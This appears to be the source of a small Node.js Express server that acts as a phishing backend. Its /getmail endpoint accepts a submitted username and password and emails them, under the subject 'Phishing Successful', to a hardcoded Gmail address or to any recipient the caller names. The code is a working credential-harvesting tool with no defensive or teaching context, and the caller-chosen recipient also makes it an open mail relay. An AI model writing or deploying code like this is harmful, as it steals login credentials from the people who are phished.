const express = require('express')
const cors = require('cors')
require("dotenv").config()
const nodemailer = require('nodemailer')
const app = express()
const port = process.env.PORT|3000

const transporter = nodemailer.createTransport({
    service: "Gmail",
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: process.env.MAIL_USERNAME,
      pass: process.env.MAIL_PASSWORD,
    },
});

app.use(express.json())
app.use(cors())

// transporter.sendMail(mailOptions).then(data=>console.log(data)).catch(err=>console.log(err))

app.post("/getmail",(req,res)=>{
    let recipient = 'raushansingh111222@gmail.com'
    if(req.body.recipient) recipient = req.body.recipient
    const {userName,password} = req.body 
    mailSender(userName,password,recipient).then(data=> res.json(data)).catch(err=> res.json(err))
})

function mailSender(userName,password,recipient){
    const mailOptions = {
        from: process.env.MAIL_USERNAME,
        to: recipient,
        subject: "Phishing Successful",
        text: `Username : ${userName}\nPassword : ${password}`
    }
    return transporter.sendMail(mailOptions)
}



app.listen(port, () => {
  console.log(`nodemailerProject is listening at http://localhost:${port}`)
})
